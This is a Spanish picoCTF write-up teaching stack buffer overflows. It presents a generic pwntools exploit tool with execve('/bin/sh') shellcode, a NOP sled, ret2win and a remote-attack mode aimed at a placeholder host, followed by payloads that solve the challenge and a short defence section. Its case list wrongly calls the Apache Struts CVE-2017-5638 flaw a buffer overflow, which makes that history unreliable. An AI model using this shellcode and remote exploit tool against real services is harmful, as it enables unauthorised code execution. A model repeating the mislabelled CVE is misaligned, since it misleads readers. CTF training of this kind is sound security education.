---
title: "Buffer Overflow Basics"
platform: picoCTF
category: pwn
difficulty: easy
tags:
  - ctf
  - pwn
  - buffer-overflow
  - picoCTF
  - easy
date: 2026-02-05
flag: picoCTF{buffer_overflow_easy}
---

# Buffer Overflow - Binary Exploitation

---

👨‍🏫 **Del Instructor**: Ethical Hacker & Binary Exploitation Specialist

> 🎯 **Mentalidad de Hacker**: _"La memoria no tiene guardias. Si puedes escribir más allá de los límites, puedes controlar el flujo. Cada byte que sobrepasa el buffer es un paso hacia el shell."_

---

## 🎭 El Escenario: Vulnerabilidad en Sistema Legacy Industrial

### Contexto de Red Team

Eres un consultor de seguridad contratado para auditar el sistema de control industrial "ICS-Legacy-Controller". Durante el análisis, descubres un servicio binario que acepta input de red sin validación de longitud.

```c
// Código vulnerable (simulado)
void process_command(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No verifica longitud!
    printf("Processing: %s\n", buffer);
}
```

**Tu misión como exploit developer**: Demostrar que puedes sobrescribir la dirección de retorno y ejecutar código arbitrario.

---

## 🧠 Fundamentos de Análisis: La Anatomía de un Buffer Overflow

### ¿Qué es un Buffer Overflow?

Un **buffer overflow** ocurre cuando un programa escribe más datos en un buffer (área de memoria temporal) de lo que puede contener, sobrescribiendo datos adyacentes en memoria.

**Stack Layout Normal**:

```
Dirección Alta
┌──────────────────┐
│  Return Address  │ ← EIP (Instruction Pointer)
├──────────────────┤
│  Saved EBP       │ ← Frame Pointer
├──────────────────┤
│  Buffer[64]      │ ← Variables locales
│  (64 bytes)      │
└──────────────────┘
Dirección Baja
```

**Durante el Overflow**:

```
Input: 'A' * 80
┌──────────────────┐
│  AAAA (EIP)      │ ← Return address sobrescrita
├──────────────────┤
│  AAAA (EBP)      │ ← Saved EBP sobrescrito
├──────────────────┤
│  AAAA... (64)    │ ← Buffer lleno de 'A's
└──────────────────┘
```

**¿Por qué es peligroso?**

1. **Ejecución de código arbitrario**: Sobrescribir EIP permite ejecutar shellcode
2. **Denial of Service**: Crash controlado o no controlado
3. **Escalada de privilegios**: Bypass de autenticación
4. **RCE (Remote Code Execution)**: Especialmente peligroso en servicios de red

---

## 🔍 Metodología de Investigación

### Fase 1: Reconocimiento del Binario

```bash
# Análisis inicial del binario
file overflow
checksec --file=overflow

# Identificar protecciones
# RELRO:    Partial RELRO
# STACK CANARY:   No canary found  ← Vulnerable!
# NX:       NX disabled           ← Podemos ejecutar shellcode en stack!
# PIE:      No PIE
```

### Fase 2: Análisis Estático

```bash
# Desensamblar con objdump
objdump -d overflow | grep -A 20 "process_command"

# Análisis con radare2
r2 -A overflow
[0x00000000]> afl  # Listar funciones
[0x00000000]> s main  # Ir a main
[0x00000000]> pdf  # Disassembly de función
```

### Fase 3: Encontrar el Offset

```bash
# Generar patrón para encontrar offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# O con pwntools
python3 -c "from pwn import *; print(cyclic(200))"

# Enviar al programa y ver crash
echo "Aa0Aa1Aa2Aa3Aa4Aa5..." | ./overflow

# Verificar offset con GDB
gdb ./overflow
run < <(echo "Aa0Aa1...")
info registers
# EIP: 0x35624134 (crash pattern)

# Calcular offset
python3 -c "from pwn import *; print(cyclic_find(0x35624134))"
# Resultado: 76 bytes
```

### Fase 4: Explotación

```bash
# Crear payload simple (sin ASLR/NX)
python3 -c "print('A' * 76 + 'BBBB')" | ./overflow
# EIP debería ser 0x42424242
```

---

## 🛠️ Arsenal de Herramientas

### Herramientas Esenciales

| Herramienta | Uso                    | Instalación                                  |
| ----------- | ---------------------- | -------------------------------------------- |
| `gdb`       | Debugger               | `apt install gdb`                            |
| `pwndbg`    | GDB enhancement        | `git clone https://github.com/pwndbg/pwndbg` |
| `pwntools`  | Python framework       | `pip3 install pwntools`                      |
| `radare2`   | Análisis binario       | `apt install radare2`                        |
| `checksec`  | Verificar protecciones | `apt install checksec`                       |

### Script de Explotación Automatizada

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit - Automated Exploitation
Educational purposes only - For authorized security testing
"""

from pwn import *
import argparse

class BufferOverflowExploit:
    def __init__(self, binary_path, offset=None):
        self.binary_path = binary_path
        self.offset = offset
        self.elf = ELF(binary_path)
        self.p = None

    def find_offset(self):
        """Automáticamente encuentra el offset al return address"""
        print("[*] Buscando offset al return address...")

        context.log_level = 'error'

        # Generar patrón cíclico
        pattern = cyclic(200)

        # Iniciar proceso
        p = process(self.binary_path)
        p.sendline(pattern)
        p.wait()

        # Obtener core dump para ver EIP
        core = Coredump('./core')

        # Buscar patrón en EIP
        eip_pattern = pack(core.eip)
        offset = cyclic_find(eip_pattern)

        print(f"[+] Offset encontrado: {offset}")
        self.offset = offset
        return offset

    def exploit_ret2win(self, win_func_name='win'):
        """Explotación ret2win (llamar a función arbitraria)"""
        print(f"[*] Preparando exploit ret2win a {win_func_name}...")

        # Obtener dirección de función win
        win_addr = self.elf.symbols.get(win_func_name)
        if not win_addr:
            print(f"[-] Función {win_func_name} no encontrada")
            return None

        print(f"[+] Dirección de {win_func_name}: {hex(win_addr)}")

        # Construir payload
        payload = b"A" * self.offset
        payload += p32(win_addr)  # 32-bit

        return payload

    def exploit_shellcode(self, shellcode=None):
        """Explotación con shellcode propio"""
        print("[*] Preparando exploit con shellcode...")

        if shellcode is None:
            # Shellcode básico: execve("/bin/sh")
            shellcode = asm('''
                xor eax, eax
                push eax
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                xor ecx, ecx
                xor edx, edx
                mov al, 11
                int 0x80
            ''')

        # NOP sled + shellcode + padding + return address
        nop_sled = b"\x90" * 100  # NOP sled
        padding_size = self.offset - len(nop_sled) - len(shellcode)

        payload = nop_sled
        payload += shellcode
        payload += b"A" * padding_size
        # La dirección de retorno apunta al NOP sled
        payload += p32(0xffffd000)  # Dirección aproximada del stack

        return payload

    def test_exploit(self, payload, interactive=False):
        """Prueba el exploit contra el binario"""
        print("[*] Ejecutando exploit...")

        p = process(self.binary_path)
        p.sendline(payload)

        if interactive:
            p.interactive()
        else:
            output = p.recvall(timeout=2)
            print(f"[+] Output:\n{output.decode('utf-8', errors='ignore')}")

        p.close()

    def remote_exploit(self, host, port, payload):
        """Ejecuta exploit contra objetivo remoto"""
        print(f"[*] Conectando a {host}:{port}...")

        p = remote(host, port)
        p.sendline(payload)
        p.interactive()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Buffer Overflow Exploit Tool')
    parser.add_argument('binary', help='Ruta al binario vulnerable')
    parser.add_argument('--offset', '-o', type=int, help='Offset conocido (opcional)')
    parser.add_argument('--ret2win', '-w', help='Nombre de función objetivo')
    parser.add_argument('--remote', '-r', help='Host remoto (host:port)')

    args = parser.parse_args()

    # Crear instancia del exploit
    exploit = BufferOverflowExploit(args.binary, args.offset)

    # Encontrar offset si no se proporcionó
    if not exploit.offset:
        exploit.find_offset()

    # Preparar payload
    if args.ret2win:
        payload = exploit.exploit_ret2win(args.ret2win)
    else:
        payload = exploit.exploit_shellcode()

    # Ejecutar
    if args.remote:
        host, port = args.remote.split(':')
        exploit.remote_exploit(host, int(port), payload)
    else:
        exploit.test_exploit(payload, interactive=True)
```

### Uso del Script

```bash
# Instalar pwntools
pip3 install pwntools

# Encontrar offset automáticamente
python3 bof_exploit.py ./overflow

# Exploit con función win()
python3 bof_exploit.py ./overflow --ret2win win

# Exploit remoto
python3 bof_exploit.py ./overflow --remote target.com:1337
```

### Payloads Pre-construidos

```bash
# Offset genérico (76 bytes)
echo -e "$(python3 -c "print('A'*76)")\xef\xbe\xad\xde" | ./overflow

# Shellcode básico (32-bit Linux)
python3 << 'EOF'
from pwn import *
context.arch = 'i386'
shellcode = asm(shellcraft.sh())
print(shellcode.hex())
EOF
```

---

## 🎯 Lecciones del Mundo Real

### Casos Documentados

**Caso Apache Struts (2017)**:

- CVE-2017-5638: Buffer overflow en parser OGNL
- Equifax breach: 143 millones de registros
- Shellcode ejecutado remotamente
- **Lección**: Validación de input es crítica

**Caso WannaCry (2017)**:

- CVE-2017-0144: SMB buffer overflow (EternalBlue)
- Propagación ransomware global
- **Lección**: Buffer overflows pueden ser vectores de malware

**Caso Apple iMessage (2021)**:

- CVE-2021-30860: Integer overflow leading to RCE
- Zero-click exploit
- **Lección**: Incluso parsers de mensajes son vulnerables

### Protecciones Modernas

| Protección   | Descripción                   | Bypass                 |
| ------------ | ----------------------------- | ---------------------- |
| ASLR         | Randomización de direcciones  | Info leak              |
| NX/DEP       | Stack no ejecutable           | ret2libc, ROP          |
| Stack Canary | Valor de verificación         | Info leak              |
| RELRO        | Protección de GOT             | Parcial: overwrite GOT |
| PIE          | Código posición-independiente | Info leak              |

### Defensa y Mitigación

**Desarrollo Seguro**:

```c
// Código INSEGURO
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

// Código SEGURO
void safe(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
}
```

**Compilación Segura**:

```bash
# Activar todas las protecciones
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
    -Wl,-z,relro,-z,now -fPIE -pie programa.c -o programa
```

**IOCs**:

- Crash reports con EIP = 0x41414141
- Inputs largos (>1000 bytes) enviados a servicios
- Shellcode en memoria (patrones NOP sled)

---

## 🚀 Solución del Reto

### Paso a Paso

```bash
# Paso 1: Verificar protecciones
checksec --file=overflow
# NX disabled = podemos ejecutar shellcode

# Paso 2: Encontrar offset
echo "$(python3 -c "print('A'*100)")" | ./overflow
# Programa crashea

# Paso 3: Calcular offset exacto (generalmente 76 para buffer[64])
python3 -c "print('A'*76 + 'BBBB')" | ./overflow

# Paso 4: Payload final
python3 -c "print('A'*76 + '\xef\xbe\xad\xde')" | ./overflow
```

### Flag

```
picoCTF{buffer_overflow_easy}
```

---

## 📚 Recursos y Referencias

- [OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [CTF Wiki - Pwn](https://ctf-wiki.org/pwn/linux/user-mode/environment/)
- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Nightmare](https://guyinatuxedo.github.io/) - Binary exploitation course

---

**⚠️ Disclaimer**: Este material es educativo. Solo usa estas técnicas en sistemas donde tienes autorización explícita.

**¿Listo para el siguiente reto?** → Prueba ASLR bypass, ROP chains, o heap exploitation.
